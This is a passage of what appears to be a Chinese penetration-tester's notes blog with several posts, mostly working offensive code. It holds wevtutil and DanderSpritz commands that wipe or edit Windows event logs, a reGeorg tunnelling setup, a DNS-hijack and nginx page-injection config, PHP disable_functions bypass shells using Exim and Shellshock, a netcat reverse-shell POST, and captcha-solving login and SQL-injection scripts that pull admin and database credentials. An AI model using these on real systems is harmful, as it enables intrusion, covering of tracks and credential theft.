&quot;Microsoft-Windows-MemoryDiagnostics-Results/Debug&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-MUI/Admin&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-MUI/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-NCSI/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-NetworkAccessProtection/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-NetworkAccessProtection/WHC&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-NetworkLocationWizard/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-NetworkProfile/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-NlaSvc/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-NTLM/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-OfflineFiles/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-ParentalControls/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-PeopleNearMe/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-PowerShell/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-PrintService/Admin&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-ReadyBoost/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-ReadyBoostDriver/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Recovery/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-ReliabilityAnalysisComponent/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-RemoteApp and Desktop Connections/Admin&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-RemoteAssistance/Admin&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-RemoteAssistance/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Resource-Exhaustion-Detector/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Resource-Exhaustion-Resolver/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Resource-Leak-Diagnostic/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-RestartManager/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Security-Audit-Configuration-Client/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-TerminalServices-LocalSessionManager/Admin&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-TerminalServices-LocalSessionManager/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-TerminalServices-PnPDevices/Admin&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-TerminalServices-PnPDevices/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-TerminalServices-RDPClient/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-TerminalServices-RemoteConnectionManager/Admin&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-TZUtil/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-UAC/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-UAC-FileVirtualization/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-User Profile Service/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-VDRVROOT/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-VHDMP/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-WER-Diag/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-WFP/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Windows Defender/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Windows Defender/WHC&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Windows Firewall With Advanced Security/ConnectionSecurity&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Windows Firewall With Advanced Security/Firewall&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-WindowsBackup/ActionCenter&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-WindowsSystemAssessmentTool/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-WindowsUpdateClient/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Winlogon/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-WinRM/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Winsock-WS2HELP/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-Wired-AutoConfig/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-WLAN-AutoConfig/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-WPD-ClassInstaller/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-WPD-CompositeClassDriver/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;Microsoft-Windows-WPD-MTPClassDriver/Operational&quot;</span><br><span class="line">wevtutil.exe cl &quot;ODiag&quot;</span><br><span class="line">wevtutil.exe cl &quot;OSession&quot;</span><br><span class="line">wevtutil.exe cl &quot;Security&quot;</span><br><span class="line">wevtutil.exe cl &quot;Setup&quot;</span><br><span class="line">wevtutil.exe cl &quot;System&quot;</span><br><span class="line">wevtutil.exe cl &quot;Windows PowerShell&quot;</span><br></pre></td></tr></table></figure></p>
+<h1 id="2-NSA-DanderSpiritz"><a href="#2-NSA-DanderSpiritz" class="headerlink" title="2:NSA DanderSpiritz"></a>2:NSA DanderSpiritz</h1><p>DanderSpritz是NSA的一款界面化的远控工具</p>
+<p>DanderSpritz是NSA的一款界面化的远控工具</p>
+<p>相关介绍可参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/NSA-DanderSpiritz%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90%E4%B8%8E%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/NSA-DanderSpiritz%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90%E4%B8%8E%E6%B5%8B%E8%AF%95/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#统计日志列表，查询所有日志信息，包含时间，数目</span><br><span class="line">eventlogquery -log Application</span><br><span class="line">#查看指定类别的日志内容</span><br><span class="line">eventlogfilter -log Application -num 10</span><br><span class="line">#删除该类日志所有内容</span><br><span class="line">eventlogclear -log Application</span><br><span class="line">#删除单条内容</span><br><span class="line">eventlogedit -log Application -record 1</span><br></pre></td></tr></table></figure></p>
+<p>注：record序号可通过eventlogfilter获得</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/03/01/windows日志清除/" data-id="cjf199x77000uwsazrbxns1p7" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/">windows</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-reGeorg-proxychains4-F-NAScan" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/01/reGeorg-proxychains4-F-NAScan/" class="article-date">
+  <time datetime="2018-03-01T06:38:36.000Z" itemprop="datePublished">2018-03-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/01/reGeorg-proxychains4-F-NAScan/">reGeorg+proxychains4+F-NAScan</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h1><p>http server 代理，支持jsp，php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://19268.101.135:8080/tunnel/tunnel.jsp -p 9050</span><br></pre></td></tr></table></figure></p>
+<h1 id="proxychains4"><a href="#proxychains4" class="headerlink" title="proxychains4"></a>proxychains4</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python F-NAScan.py -h 192.168.101</span><br></pre></td></tr></table></figure>
+<h1 id="proxychains-nmap"><a href="#proxychains-nmap" class="headerlink" title="proxychains + nmap"></a>proxychains + nmap</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sP 192.168.101.*</span><br></pre></td></tr></table></figure>
+<h1 id="F-NAScan"><a href="#F-NAScan" class="headerlink" title="F-NAScan"></a>F-NAScan</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python F-NAScan.py -h 192.168.101</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/03/01/reGeorg-proxychains4-F-NAScan/" data-id="cjf199x69000kwsazbt73ca94" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/proxy/">proxy</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-DNS劫持修改页面" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/01/DNS劫持修改页面/" class="article-date">
+  <time datetime="2018-03-01T06:35:31.000Z" itemprop="datePublished">2018-03-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/01/DNS劫持修改页面/">DNS劫持修改页面</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="https://www.secquan.org/Notes/622" target="_blank" rel="noopener">https://www.secquan.org/Notes/622</a></p>
+<p>安装及dns设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yum install dnsmasq –y</span><br><span class="line"></span><br><span class="line">vim /etc/dnsmasq.conf</span><br><span class="line"></span><br><span class="line">#在最后一行添加想要劫持的域名</span><br><span class="line">#address=/js.users.**.la/8.8.8.8会报错，所以去掉**。</span><br><span class="line">address=/js.users.la/8.8.8.8</span><br><span class="line">address=/www.5888.tv/192.168.101.133</span><br><span class="line">address=/www.5zhesc.com/139.199.3.158</span><br><span class="line">address=/域名/指向IP</span><br><span class="line"></span><br><span class="line">#启动或重启</span><br><span class="line">killall dnsmasq &amp;&amp; dnsmasq</span><br><span class="line">dnsmasq</span><br><span class="line"></span><br><span class="line">#关闭防火墙</span><br><span class="line">service iptables stop</span><br><span class="line">service iptables off  #永久关闭</span><br></pre></td></tr></table></figure></p>
+<p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">&gt; server DNSIP地址  </span><br><span class="line">&gt; js.users.la  </span><br><span class="line">&gt; ```返回8.8.8.8</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://www.zifangsky.cn/728.html" target="_blank" rel="noopener">https://www.zifangsky.cn/728.html</a><br>在kali上安装及配置nginx<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nginx -y</span><br><span class="line"></span><br><span class="line">#修改配置文件</span><br><span class="line">nginx -t  #查看nginx.conf文件位置</span><br><span class="line"></span><br><span class="line">#在/etc/nginx/conf.d目录下，新建reverse-proxy.conf</span><br><span class="line">server&#123;</span><br><span class="line">listen 80;</span><br><span class="line">server_name www.shanku.tv;</span><br><span class="line">index index.php index.html index.htm;</span><br><span class="line">root /a/domains/jquery;</span><br><span class="line">location / &#123;</span><br><span class="line">	if ($http_user_agent ~* (baiduspider|googlebot|soso|bing|sogou|yahoo|sohu-search|yodao|YoudaoBot|robozilla|msnbot|MJ12bot|NHN|Twiceler)) &#123;</span><br><span class="line">		return  403;</span><br><span class="line">	&#125;</span><br><span class="line">	#default_type text/html;</span><br><span class="line">	#subs_filter_types text/css text/xml;</span><br><span class="line">	#proxy_set_header X-Real-IP  $remote_addr;</span><br><span class="line">	#proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">	</span><br><span class="line">	####该行代码指将所有shankuwang 字符串改为 &lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">	#g代表全局，参考https://www.zifangsky.cn/728.html</span><br><span class="line">	subs_filter &apos;shankuwang&apos; &apos;&lt;script&gt;alert(1)&lt;/script&gt;&apos; g;</span><br><span class="line">	</span><br><span class="line">	proxy_pass http://www.shanku.tv;</span><br><span class="line">	#proxy_set_header Accept-Encoding &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~*\.(js)$ &#123;</span><br><span class="line">    rewrite ^/(.*)$ /1.txt?$1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#关闭apache</span><br><span class="line">service apache2 stop</span><br><span class="line"></span><br><span class="line">##开启，重启nginx</span><br><span class="line">killall nginx &amp;&amp; nginx</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subs_filter &apos;shankuwang&apos; &apos;&lt;script&gt;alert(1)&lt;/script&gt;&apos; g;</span><br><span class="line">subs_filter &apos;570037350&apos; &apos;&lt;script&gt;alert(1)&lt;/script&gt;&apos; g;</span><br><span class="line">subs_filter &apos;ID&apos; &apos;alert(1)&apos; g;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/tarn4/img/master/%E6%B8%97%E9%80%8F%E6%AD%A5%E9%AA%A4/%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E5%95%86%E6%94%BB%E5%87%BB/DNS%E5%8A%AB%E6%8C%81%E4%BF%AE%E6%94%B9%E9%A1%B5%E9%9D%A2/%E8%AE%BF%E9%97%AE.png" alt="image"></p>
+<p>代理的所有请求在access.log中可以查看，access.log文件位置在nginx.conf中有。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/03/01/DNS劫持修改页面/" data-id="cjf199x5f0000wsazhywly48f" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dns劫持/">dns劫持</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-php-disable-function-bypass" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/01/php-disable-function-bypass/" class="article-date">
+  <time datetime="2018-03-01T06:33:05.000Z" itemprop="datePublished">2018-03-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/01/php-disable-function-bypass/">php disable_function bypass</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/bypass_function.md</span><br></pre></td></tr></table></figure>
+<h2 id="Exim-mail-bypass-disable-function"><a href="#Exim-mail-bypass-disable-function" class="headerlink" title="Exim_mail_bypass_disable_function"></a>Exim_mail_bypass_disable_function</h2><p><a href="http://www.cnblogs.com/iamstudy/articles/Exim_mail_bypass_disable_function.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/Exim_mail_bypass_disable_function.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数:mail,file_put_contents,file_get_contents</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$c = @$_GET[&apos;lemon&apos;];</span><br><span class="line">$result_file = &quot;/tmp/test.txt&quot;;</span><br><span class="line">$tmp_file = &apos;/tmp/aaaaaaaaaaa.sh&apos;;</span><br><span class="line">$command = $c . &apos;&gt;&apos; . $result_file;</span><br><span class="line">file_put_contents($tmp_file, $command);</span><br><span class="line">$payload = &quot;-be \$&#123;run&#123;/bin/bash\$&#123;substr&#123;10&#125;&#123;1&#125;&#123;\$tod_log&#125;&#125;/tmp/aaaaaaaaaaa.sh&#125;&#123;ok&#125;&#123;error&#125;&#125;&quot;;</span><br><span class="line">mail(&quot;a@localhost&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, $payload);</span><br><span class="line">echo file_get_contents($result_file);</span><br><span class="line">@unlink($tmp_file);</span><br><span class="line">@unlink($result_file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="Bash-破壳漏洞-CVE-2014-6271"><a href="#Bash-破壳漏洞-CVE-2014-6271" class="headerlink" title="Bash 破壳漏洞 CVE-2014-6271"></a>Bash 破壳漏洞 CVE-2014-6271</h2><p><a href="http://www.cnblogs.com/iamstudy/articles/CVE-2014-6271_shellshock.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/CVE-2014-6271_shellshock.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php脚本绕过函数禁用，实现系统命令执行</span><br><span class="line">http://192.168.101.128/dvwa/hackable/uploads/a.php</span><br><span class="line">post：</span><br><span class="line">cmd=/bin/bash -c &apos;nc -e /bin/sh 192.168.101.129 12666&apos;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &quot;Disabled functions: &quot;.ini_get(&apos;disable_functions&apos;).&quot;\n&quot;; ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function shellshock($cmd) &#123; // Execute a command via CVE-2014-6271 @ mail.c:283</span><br><span class="line">   if(strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;</span><br><span class="line">     $tmp = tempnam(&quot;.&quot;,&quot;data&quot;);</span><br><span class="line">     putenv(&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">     // In Safe Mode, the user may only alter environment variables whose names</span><br><span class="line">     // begin with the prefixes supplied by this directive.</span><br><span class="line">     // By default, users will only be able to set environment variables that</span><br><span class="line">     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,</span><br><span class="line">     // PHP will let the user modify ANY environment variable!</span><br><span class="line">     mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&apos;t actually send any mail</span><br><span class="line">   &#125;</span><br><span class="line">   else return &quot;Not vuln (not bash)&quot;;</span><br><span class="line">   $output = @file_get_contents($tmp);</span><br><span class="line">   @unlink($tmp);</span><br><span class="line">   if($output != &quot;&quot;) return $output;</span><br><span class="line">   else return &quot;No output, or not vuln.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo shellshock($_REQUEST[&quot;cmd&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/03/01/php-disable-function-bypass/" data-id="cjf199x5m0001wsazs2jgxyyn" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/">php</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-python识别验证码" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/01/python识别验证码/" class="article-date">
+  <time datetime="2018-03-01T06:09:16.000Z" itemprop="datePublished">2018-03-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python/">python</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/01/python识别验证码/">python识别验证码</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="cwcms"><a href="#cwcms" class="headerlink" title="cwcms"></a>cwcms</h3><p><strong>识别cwcms的简单验证码，并登录后台，下载含有数据库密码的网页</strong></p>
+<ul>
+<li><p>使用session方法，使得下载图片的session和登录使用的session一致  </p>
+</li>
+<li><p>下载验证码图片后，使用tesseract.exe识别图片验证码，然后登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def login(user,passwd):</span><br><span class="line">    login_url = &apos;http://192.168.101.128/admin/index.php&apos;</span><br><span class="line">    yzm_url = &apos;http://192.168.101.128/inc/code.php&apos;</span><br><span class="line">    info_url = &apos;http://192.168.101.128/admin/cw_web.php&apos;</span><br><span class="line">    # 请求session开始，以后的请求都会被服务端记住</span><br><span class="line">    s = requests.session()</span><br><span class="line">    # 保存验证码图片</span><br><span class="line">    yzm = s.get(yzm_url)</span><br><span class="line">    with open(&apos;yzm.png&apos;, &apos;wb&apos;) as pic:</span><br><span class="line">        pic.write(yzm.content)</span><br><span class="line">        pic.close()</span><br><span class="line">    # 识别验证码</span><br><span class="line">    os.system(&apos;tesseract.exe yzm.png output -l eng&apos;)</span><br><span class="line">    with open(&apos;output.txt&apos;) as f:</span><br><span class="line">        str = f.read(5)</span><br><span class="line">        f.close()</span><br><span class="line">    # 登录数据</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        &apos;user&apos;: user,</span><br><span class="line">        &apos;pass&apos;: passwd,</span><br><span class="line">        &apos;yzm&apos;: str,</span><br><span class="line">        &apos;act&apos;: &apos;login&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    # 登录请求</span><br><span class="line">    s.post(login_url, login_data)</span><br><span class="line">    # 下载含有网站配置信息的网页</span><br><span class="line">    info = s.get(info_url)</span><br><span class="line">    with open(&apos;info.html&apos;, &apos;wb&apos;) as info_html:</span><br><span class="line">        info_html.write(info.content)</span><br><span class="line">        info_html.close()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    user = &apos;cwcms&apos;</span><br><span class="line">    passwd = &apos;cwcms&apos;</span><br><span class="line">    login(user,passwd)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="使用pytesseract模块识别验证码"><a href="#使用pytesseract模块识别验证码" class="headerlink" title="使用pytesseract模块识别验证码"></a>使用pytesseract模块识别验证码</h3><ul>
+<li>报错解决：将pytesseract.py中  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tesseract_cmd = &apos;tesseract&apos;</span><br><span class="line">```  </span><br><span class="line">改为绝对路径</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>tesseract_cmd = ‘C:/Program Files (x86)/Tesseract-OCR/tesseract.exe’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- 依赖tesseract的模块，需安装tesseract.</span><br><span class="line">- pytesseract和tesseract的准确度根据实际情况而定</span><br></pre></td></tr></table></figure></p>
+<p>tesseract.exe yzm.png output -l eng<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以在当前目录生成output.txt文件为验证码输出</span><br><span class="line"></span><br><span class="line">pytesseract使用方法</span><br></pre></td></tr></table></figure></p>
+<p>import pytesseract</p>
+<p>from PIL import Image</p>
+<p>image = Image.open(‘C:/Python36/Lib/site-packages/pytesseract/test.png’)</p>
+<p>vcode = pytesseract.image_to_string(image)</p>
+<p>print (vcode)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### cwcms</span><br><span class="line">- 注入拿到账号和密码的md5值后</span><br><span class="line">- 利用ttmd5.com接口解密</span><br><span class="line">- 解密后登录后台下载含有数据库密码的页面</span><br></pre></td></tr></table></figure></p>
+<p>import os<br>import requests<br>import re<br>from bs4 import BeautifulSoup</p>
+<p>def sql():<br>    user_url = ‘<a href="http://192.168.101.128/inc/hits.php?id=1%20and%20extractvalue(1,concat(0x5c,(select%20user%20from%20cw_admin),0x5c))&amp;tab=cw_info&#39;" target="_blank" rel="noopener">http://192.168.101.128/inc/hits.php?id=1%20and%20extractvalue(1,concat(0x5c,(select%20user%20from%20cw_admin),0x5c))&amp;tab=cw_info&#39;</a><br>    user_html = requests.get(user_url)<br>    user = re.findall(r’\(.*?)\‘,user_html.text)</p>
